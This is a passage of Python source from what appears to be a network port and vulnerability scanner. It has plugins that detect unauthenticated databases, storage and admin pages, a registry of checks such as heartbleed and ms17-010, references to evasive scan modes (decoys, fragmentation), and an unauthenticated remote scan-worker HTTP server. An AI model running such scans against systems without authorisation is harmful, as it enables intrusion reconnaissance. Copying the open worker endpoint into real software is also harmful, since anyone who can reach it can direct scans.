    """Detect unauthenticated InfluxDB v1/v2 REST API."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((f"GET /ping HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(2048).decode("utf-8", errors="replace")
        s.close()
        if ("204" in resp[:20] or "200" in resp[:20]) and (
                "X-Influxdb-Version" in resp or "x-influxdb" in resp.lower()):
            ver_m = re.search(r"[Xx]-[Ii]nfluxdb-[Vv]ersion:\s*(\S+)", resp)
            ver   = ver_m.group(1) if ver_m else "?"
            return PluginResult(
                plugin="influxdb-unauth", port=port,
                output=f"InfluxDB v{ver} UNAUTHENTICATED ping — "
                       f"check /query and /write endpoints",
                data={"version": ver, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_minio_unauth(ip: str, port: int,
                          timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated MinIO / S3-compatible API (list buckets)."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall((f"GET / HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if ("ListAllMyBucketsResult" in resp
                or "minio" in resp.lower()
                or "AmazonS3" in resp):
            buckets = re.findall(r"<Name>([^<]+)</Name>", resp)
            bucket_list = ", ".join(buckets[:8]) or "none listed"
            return PluginResult(
                plugin="minio-unauth", port=port,
                output=f"MinIO/S3 UNAUTHENTICATED — buckets: {bucket_list}",
                data={"buckets": buckets, "severity": "CRITICAL"})
    except Exception:
        pass
    return None


def _plugin_hadoop_unauth(ip: str, port: int,
                            timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated Hadoop NameNode HTTP API."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((f"GET /jmx?qry=Hadoop:service=NameNode,name=NameNodeInfo "
                   f"HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                   ).encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if "200" in resp[:20] and ("NameNodeInfo" in resp or "LiveNodes" in resp):
            ver_m = re.search(r'"Version"\s*:\s*"([^"]+)"', resp)
            ver   = ver_m.group(1) if ver_m else "?"
            return PluginResult(
                plugin="hadoop-unauth", port=port,
                output=f"Hadoop NameNode UNAUTHENTICATED — version: {ver}",
                data={"version": ver, "severity": "CRITICAL"})
    except Exception:
        pass
    return None


def _plugin_phpmyadmin_detect(ip: str, port: int,
                                timeout: float) -> Optional[PluginResult]:
    """Detect phpMyAdmin login page — common target for credential attacks."""
    use_ssl = port in SSL_PORTS
    PATHS = ["/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/db/", "/mysql/",
             "/phpmyadmin", "/phpMyAdmin"]
    try:
        for path in PATHS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout / 3)
                s.connect((ip, port))
                if use_ssl:
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                s.sendall((f"GET {path} HTTP/1.1\r\n"
                            f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
                resp = s.recv(4096).decode("utf-8", errors="replace")
                s.close()
                if ("200" in resp[:20]
                        and ("phpMyAdmin" in resp or "phpmyadmin" in resp.lower())):
                    return PluginResult(
                        plugin="phpmyadmin-detect", port=port,
                        output=f"phpMyAdmin found at {path}",
                        data={"path": path, "severity": "MEDIUM"})
            except Exception:
                pass
    except Exception:
        pass
    return None


# ── Plugin Registry ────────────────────────────────────────────────
BUILTIN_PLUGINS: List[PluginSpec] = [
    # ── Service information plugins (UPG-2) ─────────────────────────
    PluginSpec("http-title",  [80, 443, 8080, 8443, 8000, 8008],
               "tcp", _plugin_http_title),
    PluginSpec("ftp-anon",    [21],
               "tcp", _plugin_ftp_anon),
    PluginSpec("redis-info",  [6379],
               "tcp", _plugin_redis_info),
    PluginSpec("ssl-cert",    [443, 993, 995, 465, 8443, 636, 5986],
               "tcp", _plugin_ssl_cert),
    PluginSpec("smb-os",      [445, 139],
               "tcp", _plugin_smb_os),
    PluginSpec("ssh-auth",    [22, 2222],
               "tcp", _plugin_ssh_auth),
    PluginSpec("http-server", [80, 443, 8080, 8443, 8000, 8008],
               "tcp", _plugin_http_server),
    # ── Vulnerability detection plugins (ENH-4) ──────────────────────
    PluginSpec("ssl-weak-ciphers",       [443, 8443, 993, 995, 465, 636],
               "tcp", _plugin_ssl_weak_ciphers),
    PluginSpec("http-security-headers",  [80, 443, 8080, 8443, 8000, 8008],
               "tcp", _plugin_http_security_headers),
    PluginSpec("default-creds",          [21, 6379, 27017],
               "tcp", _plugin_default_creds),
    PluginSpec("open-redirect",          [80, 443, 8080, 8443],
               "tcp", _plugin_open_redirect),
    PluginSpec("smb-signing",            [445, 139],
               "tcp", _plugin_smb_signing),
    PluginSpec("docker-unauth",          [2375, 2376],
               "tcp", _plugin_docker_unauth),
    PluginSpec("heartbleed",             [443, 8443, 993, 995, 465],
               "tcp", _plugin_heartbleed),
    PluginSpec("ms17-010",               [445, 139],
               "tcp", _plugin_ms17_010),
    PluginSpec("http-methods",           [80, 443, 8080, 8443, 8000],
               "tcp", _plugin_http_methods),
    PluginSpec("dns-zone-transfer",      [53],
               "tcp", _plugin_dns_zone_transfer),
    PluginSpec("smtp-open-relay",        [25, 587, 465, 2525],
               "tcp", _plugin_smtp_open_relay),
    PluginSpec("ssh-hostkey",            [22, 2222],
               "tcp", _plugin_ssh_hostkey),
    PluginSpec("telnet-banner",          [23, 2323],
               "tcp", _plugin_telnet_banner),
    PluginSpec("vnc-no-auth",            [5900, 5901, 5902],
               "tcp", _plugin_vnc_no_auth),
    PluginSpec("http-robots",            [80, 443, 8080, 8443, 8000],
               "tcp", _plugin_http_robots),
    PluginSpec("mysql-empty-password",   [3306],
               "tcp", _plugin_mysql_empty_password),
    PluginSpec("ntp-monlist",            [123],
               "udp", _plugin_ntp_monlist),
    PluginSpec("elasticsearch-unauth",   [9200, 9300],
               "tcp", _plugin_elasticsearch_unauth),
    PluginSpec("k8s-unauth",             [6443, 8080, 8443],
               "tcp", _plugin_k8s_unauth),
    PluginSpec("memcached-unauth",       [11211],
               "tcp", _plugin_memcached_unauth),
    PluginSpec("rsync-unauth",           [873],
               "tcp", _plugin_rsync_unauth),
    PluginSpec("snmp-community",         [161],
               "udp", _plugin_snmp_community),
    PluginSpec("ldap-rootdse",           [389, 636],
               "tcp", _plugin_ldap_rootdse),
    PluginSpec("pop3-capabilities",      [110, 995],
               "tcp", _plugin_pop3_capabilities),
    PluginSpec("iis-webdav",             [80, 443, 8080, 8443],
               "tcp", _plugin_iis_webdav),
    PluginSpec("tftp-test",              [69],
               "udp", _plugin_tftp_test),
    # ── [ENH-7] Expanded vulnerability plugins ───────────────────────
    PluginSpec("ssl-poodle",             [443, 8443, 993, 995, 465, 636],
               "tcp", _plugin_ssl_poodle),
    PluginSpec("ssl-logjam",             [443, 8443, 993, 995, 465, 636],
               "tcp", _plugin_ssl_logjam),
    PluginSpec("ssl-drown",              [443, 8443, 993, 995, 465],
               "tcp", _plugin_ssl_drown),
    PluginSpec("cve-2021-44228",         [80, 443, 8080, 8443, 8000, 8008],
               "tcp", _plugin_cve_2021_44228),
    PluginSpec("http-auth-type",         [80, 443, 8080, 8443, 8000],
               "tcp", _plugin_http_auth_type),
    PluginSpec("http-cors",              [80, 443, 8080, 8443, 8000],
               "tcp", _plugin_http_cors),
    PluginSpec("http-cookie-flags",      [80, 443, 8080, 8443],
               "tcp", _plugin_http_cookie_flags),
    PluginSpec("http-clickjacking",      [80, 443, 8080, 8443],
               "tcp", _plugin_http_clickjacking),
    PluginSpec("smtp-starttls",          [25, 587, 465, 2525],
               "tcp", _plugin_smtp_starttls),
    PluginSpec("imap-capabilities",      [143, 993],
               "tcp", _plugin_imap_capabilities),
    PluginSpec("rdp-encryption",         [3389],
               "tcp", _plugin_rdp_encryption),
    PluginSpec("mongodb-unauth",         [27017, 27018, 27019],
               "tcp", _plugin_mongodb_unauth),
    PluginSpec("postgres-empty-password",[5432],
               "tcp", _plugin_postgres_empty_pass),
    PluginSpec("mssql-empty-password",   [1433, 1434],
               "tcp", _plugin_mssql_empty_pass),
    PluginSpec("jenkins-unauth",         [8080, 8443, 8090],
               "tcp", _plugin_jenkins_unauth),
    PluginSpec("git-config",             [80, 443, 8080, 8443],
               "tcp", _plugin_git_config),
    PluginSpec("spring-actuator",        [80, 443, 8080, 8443, 8090],
               "tcp", _plugin_spring_actuator),
    PluginSpec("grafana-anon",           [3000, 3001],
               "tcp", _plugin_grafana_anon),
    PluginSpec("etcd-unauth",            [2379, 2380],
               "tcp", _plugin_etcd_unauth),
    PluginSpec("consul-unauth",          [8500, 8501],
               "tcp", _plugin_consul_unauth),
    PluginSpec("zookeeper-unauth",       [2181, 2182],
               "tcp", _plugin_zookeeper_unauth),
    PluginSpec("mqtt-unauth",            [1883, 8883],
               "tcp", _plugin_mqtt_unauth),
    PluginSpec("cassandra-unauth",       [9042, 9160],
               "tcp", _plugin_cassandra_unauth),
    PluginSpec("influxdb-unauth",        [8086, 8088],
               "tcp", _plugin_influxdb_unauth),
    PluginSpec("minio-unauth",           [9000, 9001],
               "tcp", _plugin_minio_unauth),
    PluginSpec("hadoop-unauth",          [50070, 9870],
               "tcp", _plugin_hadoop_unauth),
    PluginSpec("phpmyadmin-detect",      [80, 443, 8080, 8443],
               "tcp", _plugin_phpmyadmin_detect),
]

# Index: port → list of applicable plugins
_PLUGIN_INDEX: Dict[int, List[PluginSpec]] = {}
for _pl in BUILTIN_PLUGINS:
    for _port in _pl.ports:
        _PLUGIN_INDEX.setdefault(_port, []).append(_pl)


def load_external_plugins(plugin_dir: str) -> List[PluginSpec]:
    """
    [UPG-2] Load external plugins from a directory.
    Each .py file must define:
      NAME     : str   — plugin name
      PORTS    : list  — ports to apply to ([] = all open)
      PROTOCOL : str   — "tcp" or "udp"
      def run(ip, port, timeout) -> Optional[PluginResult]
    """
    plugins: List[PluginSpec] = []
    if not os.path.isdir(plugin_dir):
        return plugins
    for fname in sorted(os.listdir(plugin_dir)):
        if not fname.endswith(".py") or fname.startswith("_"):
            continue
        fpath = os.path.join(plugin_dir, fname)
        try:
            spec_obj = importlib.util.spec_from_file_location(
                fname[:-3], fpath)
            mod = importlib.util.module_from_spec(spec_obj)
            spec_obj.loader.exec_module(mod)
            ps = PluginSpec(
                name     = getattr(mod, "NAME",     fname[:-3]),
                ports    = getattr(mod, "PORTS",    []),
                protocol = getattr(mod, "PROTOCOL", "tcp"),
                run      = mod.run,
            )
            plugins.append(ps)
        except Exception as exc:
            print(color(f"[!] Plugin load failed ({fname}): {exc}", YELLOW))
    return plugins


def run_plugins(ip: str, port: int, protocol: str,
                plugins: List[PluginSpec],
                timeout: float) -> List[PluginResult]:
    """Run all matching plugins for an open port. Returns list of results."""
    applicable = [
        p for p in plugins
        if (not p.ports or port in p.ports) and p.protocol == protocol
    ]
    results: List[PluginResult] = []
    for plug in applicable:
        try:
            res = plug.run(ip, port, timeout)
            if res is not None:
                results.append(res)
        except Exception:
            pass
    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-5] REAL-TIME PROGRESS DISPLAY
# ═══════════════════════════════════════════════════════════════════

class ProgressTracker:
    """
    [ENH-5] tqdm-style inline progress bar for port scanning.

    Writes a single updating line to stderr if the output is a TTY.
    Falls back to periodic log lines (every 5%) if not a TTY.

    Thread-safe: update() can be called from any worker thread.

    Display format:
      [=====>    ] 450/1024 ports  43.9%  178 p/s  ETA 3s  ■■ 3 open
    """

    def __init__(self, total: int, label: str = ""):
        self.total     = max(1, total)
        self.label     = label
        self._done     = 0
        self._open     = 0
        self._lock     = threading.Lock()
        self._start    = time.time()
        self._is_tty   = sys.stdout.isatty()
        self._last_pct = -1
        self._bar_w    = 30   # width of the progress bar in chars

    def update(self, n: int = 1, is_open: bool = False) -> None:
        with self._lock:
            self._done += n
            if is_open:
                self._open += 1
            self._render()

    def _render(self) -> None:
        """Must be called with self._lock held."""
        pct     = self._done / self.total
        elapsed = max(0.001, time.time() - self._start)
        rate    = self._done / elapsed
        eta     = (self.total - self._done) / max(rate, 0.001)

        filled  = int(self._bar_w * pct)
        bar     = "=" * filled + (">" if filled < self._bar_w else "") + \
                  " " * (self._bar_w - filled - (1 if filled < self._bar_w else 0))

        line = (f"\r  [{bar}] {self._done}/{self.total}"
                f"  {pct*100:.1f}%"
                f"  {rate:.0f}p/s"
                f"  ETA {eta:.0f}s"
                f"  open:{self._open}")
        if self.label:
            line += f"  {self.label}"

        if self._is_tty:
            sys.stdout.write(line)
            sys.stdout.flush()
        else:
            # Non-TTY: log every 5% milestone
            pct_int = int(pct * 100)
            if pct_int // 5 != self._last_pct // 5:
                self._last_pct = pct_int
                print(f"  Progress: {pct_int}%"
                      f" ({self._done}/{self.total}"
                      f"  {rate:.0f}p/s"
                      f"  open:{self._open})")

    def finish(self) -> None:
        """Call when scan is complete to print a final newline."""
        if self._is_tty:
            sys.stdout.write("\n")
            sys.stdout.flush()


# ═══════════════════════════════════════════════════════════════════
# [ENH-6] SCAN CHECKPOINTING
# ═══════════════════════════════════════════════════════════════════

class ScanCheckpoint:
    """
    [ENH-6] Persist scan state to disk mid-scan so large scans can be
    resumed if interrupted.

    File format: JSON with:
      {
        "targets":   ["10.0.0.1", ...],   # full target list
        "completed": ["10.0.0.1", ...],   # hosts fully scanned
        "results":   { "10.0.0.1": {...} } # serialised HostResult
      }

    Usage:
      cp = ScanCheckpoint("state.json", targets)
      # after each host:
      cp.save_host(hr)
      # on resume:
      remaining, results = cp.load()
    """

    def __init__(self, path: str, targets: Optional[List[str]] = None):
        self.path       = path
        self._lock      = threading.Lock()
        self._completed: set = set()
        self._results:   Dict[str, Any] = {}
        self._targets:   List[str] = targets or []

        # Write initial file if targets provided (new scan)
        if targets and not os.path.exists(path):
            self._flush()

    def save_host(self, hr: HostResult) -> None:
        """Persist a completed HostResult to the checkpoint file."""
        with self._lock:
            self._completed.add(hr.ip)
            # Convert HostResult to serialisable dict
            hr_dict = {
                "ip":         hr.ip,
                "status":     hr.status,
                "hostname":   hr.hostname,
                "ttl":        hr.ttl,
                "latency_ms": hr.latency_ms,
                "os_guess":   hr.os_guess,
                "open_count": hr.open_count,
                "ports": [
                    {"port":     p.port,
                     "protocol": p.protocol,
                     "state":    p.state,
                     "service":  p.service,
                     "version":  p.version,
                     "banner":   p.banner,
                     "reason":   p.reason}
                    for p in hr.ports
                ]
            }
            self._results[hr.ip] = hr_dict
            self._flush()

    def _flush(self) -> None:
        """Write checkpoint file (must be called with self._lock held)."""
        state = {
            "targets":   self._targets,
            "completed": list(self._completed),
            "results":   self._results,
        }
        try:
            tmp = self.path + ".tmp"
            with open(tmp, "w") as f:
                json.dump(state, f, indent=2)
            os.replace(tmp, self.path)
        except Exception as exc:
            print(color(f"[!] Checkpoint write failed: {exc}", YELLOW))

    @classmethod
    def load(cls, path: str) -> Tuple[List[str], List[HostResult]]:
        """
        Load a checkpoint file.
        Returns (remaining_targets, completed_host_results).
        """
        try:
            with open(path) as f:
                state = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as exc:
            raise ValueError(f"Cannot load checkpoint '{path}': {exc}")

        completed_ips = set(state.get("completed", []))
        all_targets   = state.get("targets", [])
        remaining     = [t for t in all_targets if t not in completed_ips]

        # Reconstruct HostResult objects
        host_results: List[HostResult] = []
        for ip, d in state.get("results", {}).items():
            hr = HostResult(ip=ip)
            hr.status     = d.get("status",     "up")
            hr.hostname   = d.get("hostname",   "")
            hr.ttl        = d.get("ttl",        0)
            hr.latency_ms = d.get("latency_ms", 0.0)
            hr.os_guess   = d.get("os_guess",   "")
            hr.open_count = d.get("open_count", 0)
            for pd in d.get("ports", []):
                pr = PortResult(port=pd["port"])
                pr.protocol = pd.get("protocol", "tcp")
                pr.state    = pd.get("state",    "unknown")
                pr.service  = pd.get("service",  "")
                pr.version  = pd.get("version",  "")
                pr.banner   = pd.get("banner",   "")
                pr.reason   = pd.get("reason",   "")
                hr.ports.append(pr)
            host_results.append(hr)

        print(color(
            f"[*] Resuming from '{path}': "
            f"{len(completed_ips)}/{len(all_targets)} hosts done, "
            f"{len(remaining)} remaining.", CYAN))
        return remaining, host_results


# ═══════════════════════════════════════════════════════════════════
# [V9-2] DISTRIBUTED SCANNING
# ═══════════════════════════════════════════════════════════════════

import multiprocessing
import http.server
import urllib.parse
import urllib.request
import urllib.error


def _shard_scan_worker(args_tuple: Tuple) -> List[Dict]:
    """
    [V9-2] Worker function for multiprocessing.Pool.
    Runs a full connect-scan on a shard of targets.
    Returns serialisable list of host result dicts.
    """
    (ip_shard, ports, timeout, scan_type, banner_grab) = args_tuple
    results: List[Dict] = []

    for ip in ip_shard:
        hr_dict: Dict[str, Any] = {
            "ip": ip, "status": "unknown", "ports": []}

        # Quick TCP ping to check liveness
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            # Try first port from list
            test_port = ports[0] if ports else 80
            s.connect((ip, test_port))
            s.close()
            hr_dict["status"] = "up"
        except Exception:
            pass

        # Scan ports
        for port in ports:
            try:
                r = tcp_connect_scan(ip, port, timeout)
                port_dict: Dict[str, Any] = {
                    "port": port, "state": r.state,
                    "service": r.service, "version": r.version,
                    "banner": r.banner}
                if r.state == "open" and banner_grab:
                    ver, banner = run_service_probe(ip, port, timeout)
                    port_dict["version"] = ver
                    port_dict["banner"]  = banner
                hr_dict["ports"].append(port_dict)
            except Exception:
                pass

        open_c = sum(1 for p in hr_dict["ports"] if p["state"] == "open")
        hr_dict["open_count"] = open_c
        if open_c > 0:
            hr_dict["status"] = "up"
        results.append(hr_dict)

    return results


class DistributedScanner:
    """
    [V9-2] Multi-process distributed scanner.

    Splits the target list into N equal shards, spawns N worker
    sub-processes via multiprocessing.Pool, and merges results.

    Each worker runs tcp_connect_scan + run_service_probe independently
    with no shared state (safe for multiprocessing).

    For remote nodes, pair with DistributedWorkerServer which exposes
    an HTTP API so agents on other machines can receive shards.

    Usage:
        ds = DistributedScanner(workers=4, timeout=1.5)
        summary = ds.scan(targets, ports=parse_ports("80,443,22"))
        print(f"{summary['total_open']} open ports found")
    """

    def __init__(self, workers: int = 4,
                 timeout: float = 1.5,
                 scan_type: str = "connect",
                 banner_grab: bool = False):
        self.workers     = min(workers,
                               multiprocessing.cpu_count() * 2)
        self.timeout     = timeout
        self.scan_type   = scan_type
        self.banner_grab = banner_grab

    def _shard(self, lst: List, n: int) -> List[List]:
        """Split list into n roughly-equal shards."""
        k, m = divmod(len(lst), n)
        return [lst[i*k + min(i,m): (i+1)*k + min(i+1,m)]
                for i in range(n) if lst[i*k + min(i,m): (i+1)*k + min(i+1,m)]]

    def scan(self, targets: List[str],
             ports: Optional[List[int]] = None) -> Dict[str, Any]:
        """
        Distribute scan across self.workers processes.
        Returns merged summary dict.
        """
        if not targets:
            return {"results": [], "total_open": 0}

        ports    = ports or [80, 443, 22, 21, 25, 3306, 6379]
        shards   = self._shard(targets, self.workers)
        job_args = [
            (shard, ports, self.timeout, self.scan_type, self.banner_grab)
            for shard in shards
        ]

        print(color(
            f"[*] Distributed scan: {self.workers} workers × "
            f"{len(shards[0]) if shards else 0} hosts/shard"
            f" ({len(targets)} total targets)", CYAN))

        all_results: List[Dict] = []
        try:
            with multiprocessing.Pool(processes=self.workers) as pool:
                shard_results = pool.map(_shard_scan_worker, job_args)
            for sr in shard_results:
                all_results.extend(sr)
        except Exception as exc:
            print(color(f"[!] Distributed scan error: {exc}", RED))
            # Serial fallback
            for args in job_args:
                all_results.extend(_shard_scan_worker(args))

        total_open = sum(h.get("open_count", 0) for h in all_results)
        up_count   = sum(1 for h in all_results if h.get("status") == "up")

        return {
            "results":    all_results,
            "total_open": total_open,
            "hosts_up":   up_count,
            "hosts_total": len(targets),
        }

    def print_results(self, summary: Dict[str, Any]) -> None:
        print(color(
            f"\n[*] Distributed scan complete: "
            f"{summary['hosts_up']}/{summary['hosts_total']} hosts up, "
            f"{summary['total_open']} open ports", YELLOW))
        for hr in summary["results"]:
            open_ports = [p for p in hr["ports"] if p["state"] == "open"]
            if not open_ports:
                continue
            lbl = color(hr["ip"], GREEN)
            print(f"\n  {lbl}  ({hr.get('status','?')})")
            for p in open_ports:
                ver = f"  [{p['version']}]" if p.get("version") else ""
                print(f"    {p['port']:<7} {p['service']:<16}{ver}")


class DistributedWorkerServer:
    """
    [V9-2] Lightweight HTTP API server that runs on remote worker nodes.

    The coordinator sends scan jobs as JSON POST requests;
    the worker scans and returns results as JSON.

    Endpoints:
      POST /scan   body: {"targets": [...], "ports": [...], "timeout": N}
                   returns: {"results": [...]}
      GET  /ping   returns: {"status": "ok", "node": hostname}

    Usage (on each worker node):
        server = DistributedWorkerServer(host="0.0.0.0", port=9876)
        server.start()   # blocks

    Coordinator sends shards to http://worker-ip:9876/scan
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 9876):
        self.host = host
        self.port = port

    def start(self) -> None:
        """Start HTTP server (blocking)."""
        import json as _json
        host, port = self.host, self.port
        node_name  = socket.gethostname()

        class _Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args: Any) -> None:
                pass  # silence default logging

            def do_GET(self) -> None:
                if self.path == "/ping":
                    body = _json.dumps({"status": "ok", "node": node_name}).encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self) -> None:
                if self.path != "/scan":
                    self.send_response(404)
                    self.end_headers()
                    return
                length = int(self.headers.get("Content-Length", 0))
                body   = self.rfile.read(length)
                try:
                    req      = _json.loads(body)
                    targets  = req.get("targets", [])
                    ports    = req.get("ports", [80, 443, 22])
                    timeout  = float(req.get("timeout", 1.5))
                    results  = _shard_scan_worker(
                        (targets, ports, timeout, "connect", False))
                    resp = _json.dumps({"results": results}).encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(resp)
                except Exception as exc:
                    err = _json.dumps({"error": str(exc)}).encode()
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(err)

        print(color(
            f"[*] DistributedWorkerServer listening on {host}:{port}", CYAN))
        srv = http.server.HTTPServer((host, port), _Handler)
        srv.serve_forever()

    @staticmethod
    def send_shard(worker_url: str, targets: List[str],
                   ports: List[int], timeout: float = 1.5) -> List[Dict]:
        """
        Send a shard to a remote worker node.
        Returns list of host result dicts, or [] on error.
        """
        import json as _json
        payload = _json.dumps({
            "targets": targets, "ports": ports, "timeout": timeout
        }).encode()
        try:
            req  = urllib.request.Request(
                f"{worker_url}/scan",
                data    = payload,
                headers = {"Content-Type": "application/json"},
                method  = "POST")
            with urllib.request.urlopen(req, timeout=300) as resp:
                return _json.loads(resp.read()).get("results", [])
        except Exception as exc:
            print(color(f"[!] Worker {worker_url} failed: {exc}", YELLOW))
            return []


class PyScanner:
    def __init__(self, args: argparse.Namespace):
        self.args       = args
        self.timeout    = args.timeout
        self.threads    = args.threads
        self.scan_type  = args.scan_type
        self.results: List[HostResult] = []
        self._lock      = threading.Lock()
        self._stop      = False
        self._errors: List[str] = []
        signal.signal(signal.SIGINT, self._handle_sigint)

        # [UPG-3] Apply timing mode — overrides individual timeout/thread/rate
        t_level = getattr(args, "timing", 3)
        if t_level in T_MODES:
            tm = T_MODES[t_level]
            self.timeout = tm.timeout
            self.threads = tm.parallelism
            # Update global rate limiter if timing mode specifies one
            global _RATE_LIMITER, SYN_MAX_RETRIES, ICMP_MAX_PROBES
            if tm.max_rate > 0:
                _RATE_LIMITER = TokenBucket(tm.max_rate, tm.max_rate)
            SYN_MAX_RETRIES = tm.syn_retries
            ICMP_MAX_PROBES = tm.icmp_probes
            if tm.probe_delay > 0:
                # Encode as a very low rate bucket if no explicit rate
                if tm.max_rate == 0 or _RATE_LIMITER is None:
                    _RATE_LIMITER = TokenBucket(
                        1.0 / tm.probe_delay,
                        max(1, int(1.0 / tm.probe_delay)))

        # [UPG-4] Async engine — shared RTT estimator across hosts
        self._rtt = AdaptiveRTT(initial_rtt=min(self.timeout / 2, 0.5))
        use_async = (getattr(args, "use_async", False)
                     or getattr(args, "timing", 3) >= 4)
        self._use_async = use_async

        # [UPG-2] Plugin system
        self._plugins: List[PluginSpec] = list(BUILTIN_PLUGINS)
        plugin_dir = getattr(args, "plugin_dir", None) or ""
        if plugin_dir:
            ext = load_external_plugins(plugin_dir)
            self._plugins.extend(ext)
            if ext:
                print(color(f"[*] Loaded {len(ext)} external plugin(s) "
                            f"from {plugin_dir}", CYAN))

    def _handle_sigint(self, sig, frame):
        print(color("\n[!] Scan interrupted by user.", RED))
        self._stop = True

    def resolve_targets(self) -> List[str]:
        """
        [FIX-27] Passes ipv6 preference through to resolver.
        [FIX-33] Passes force_large flag to expand_cidr.
        [FIX-35] Applies --exclude list to filter out unwanted IPs/CIDRs.
        """
        prefer_v6    = getattr(self.args, "_prefer_ipv6", False)
        force_large  = getattr(self.args, "force_large",  False)

        # [FIX-35] Build exclusion set from --exclude argument
        exclude_ips: set = set()
        exclude_str = getattr(self.args, "exclude", None) or ""
        for token in exclude_str.split(","):
            token = token.strip()
            if not token:
                continue
            if "/" in token:
                try:
                    for h in ipaddress.ip_network(token, strict=False).hosts():
                        exclude_ips.add(str(h))
                except ValueError:
                    pass
            elif "-" in token:
                # Range like 10.0.0.1-10.0.0.50
                try:
                    lo_str, hi_str = token.split("-", 1)
                    lo = ipaddress.ip_address(lo_str.strip())
                    hi = ipaddress.ip_address(hi_str.strip())
                    cur = lo
                    while cur <= hi:
                        exclude_ips.add(str(cur))
                        cur += 1
                except Exception:
                    pass
            else:
                exclude_ips.add(token)

        targets: List[str] = []
        for t in self.args.targets:
            if "/" in t:
                targets.extend(expand_cidr(t, force_large=force_large))
            else:
                ip = resolve_host(t, prefer_ipv6=prefer_v6)
                if ip:
                    targets.append(ip)
                else:
                    print(color(f"[!] Could not resolve: {t}", RED))

        # [FIX-35] Remove excluded hosts
        targets = [ip for ip in targets if ip not in exclude_ips]
        if exclude_ips and len(targets) < len(self.args.targets):
            n = len(exclude_ips)
            print(color(f"[*] Excluding {n} host(s) from scan.", YELLOW))

        # [ENH-11] Permute target order if --permute or --randomise
        use_permute = (getattr(self.args, "permute", False)
                       or getattr(self.args, "randomise", False))
        if use_permute and len(targets) > 1:
            perm_seed = getattr(self.args, "_perm_seed", None)
            targets   = permute_targets(targets, seed=perm_seed)
            if getattr(self.args, "permute", False):
                print(color(
                    f"[*] Target permutation: ENABLED  "
                    f"(seed={perm_seed or 'random'}, "
                    f"{len(targets)} targets in cyclic-group order)",
                    CYAN))

        return list(dict.fromkeys(targets))

    def ping_host(self, ip: str) -> HostResult:
        hr = HostResult(ip=ip)
        hr.scan_time = now_str()
        if self.args.skip_ping:
            hr.status   = "up"
            hr.hostname = reverse_dns(ip)
            return hr
        up, lat, ttl = icmp_ping(ip, self.timeout)
        if up:
            hr.status     = "up"
            hr.latency_ms = lat
            hr.ttl        = ttl
            hr.hostname   = reverse_dns(ip)
            hr.os_guess   = ttl_to_os(ttl)
        return hr

    def scan_port(self, ip: str, port: int) -> PortResult:
        """Route single-port scan to correct engine based on --scan-type."""
        if self.scan_type == "udp":
            return udp_scan(ip, port, self.timeout)
        elif self.scan_type == "syn":
            return tcp_syn_scan(ip, port, self.timeout)
        elif self.scan_type == "connect":
            return tcp_connect_scan(ip, port, self.timeout)
        # [UPG-3] Advanced / stealth scan types (single port via batch engine)
        elif self.scan_type == "null":
            return null_scan(ip, [port], self.timeout).get(
                port, PortResult(port=port, state="unknown"))
        elif self.scan_type == "fin":
            return fin_scan(ip, [port], self.timeout).get(
                port, PortResult(port=port, state="unknown"))
        elif self.scan_type == "xmas":
            return xmas_scan(ip, [port], self.timeout).get(
                port, PortResult(port=port, state="unknown"))
        elif self.scan_type == "ack":
            return ack_scan(ip, [port], self.timeout).get(
                port, PortResult(port=port, state="unknown"))
        elif self.scan_type == "window":
            return window_scan(ip, [port], self.timeout).get(
                port, PortResult(port=port, state="unknown"))
        else:
            return tcp_connect_scan(ip, port, self.timeout)

    def scan_ports(self, hr: HostResult, ports: List[int]) -> None:
        """
        [FIX-7]  Semaphore limits raw-socket concurrency.
        [FIX-8]  All worker exceptions caught and logged.
        [FIX-19] Optional port-order randomisation + inter-probe jitter.
        [FIX-20] SYN uses shared-socket batch engine.
        [UPG-2]  Plugins run post-scan on each open port.
        [UPG-3]  Stealth types (null/fin/xmas/ack/window) use batch engine.
        [UPG-4]  Async engine activated for SYN when --async or -T4/-T5.
        [ENH-8]  Stateless engine when --stateless set.
        [ENH-9]  Decoy packets when --decoys set.
        [ENH-10] Fragmented SYN when --fragment set.
        """
        scan_order = list(ports)
        if getattr(self.args, "randomise", False) or \
                getattr(self.args, "permute", False):
            # [ENH-11] Use cyclic-group permutation instead of simple shuffle
            perm_seed  = getattr(self.args, "_perm_seed", None)
            scan_order = permute_ports(scan_order, seed=perm_seed)

        batch_results: Optional[Dict[int, PortResult]] = None

